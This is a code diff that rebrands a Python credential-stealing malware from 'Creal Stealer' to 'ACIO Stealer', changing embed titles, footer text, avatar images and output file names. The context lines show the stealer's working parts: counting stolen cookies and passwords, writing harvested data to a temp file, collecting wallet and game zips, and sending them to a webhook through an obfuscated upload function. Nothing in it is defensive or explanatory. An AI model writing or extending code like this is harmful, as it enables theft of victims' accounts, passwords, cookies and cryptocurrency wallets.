@@ -458,7 +458,7 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "ACIO | Cookies Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [ACIOCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
                         "text": "ACIO Stealer",
@@ -484,7 +484,7 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "ACIO | Password Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [ACIOPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
                         "text": "ACIO Stealer",
@@ -537,7 +537,7 @@ def upload(name, link):
 def wr1tef0rf1l3(data, name):
     path = os.getenv("TEMP") + f"\cr{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Creal STEALER BEST -->\n\n")
+        f.write(f"<--ACIO RUNS CORD -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -702,17 +702,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "ACIO Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                "text": "ACIO Stealer",
+                "icon_url": "https://imgur.com/pbkXJZh.png"
             }
             }
         ],
-        "username": "Creal Stealer",
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+        "username": "ACIO Stealer",
+        "avatar_url": "https://imgur.com/pbkXJZh.png",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
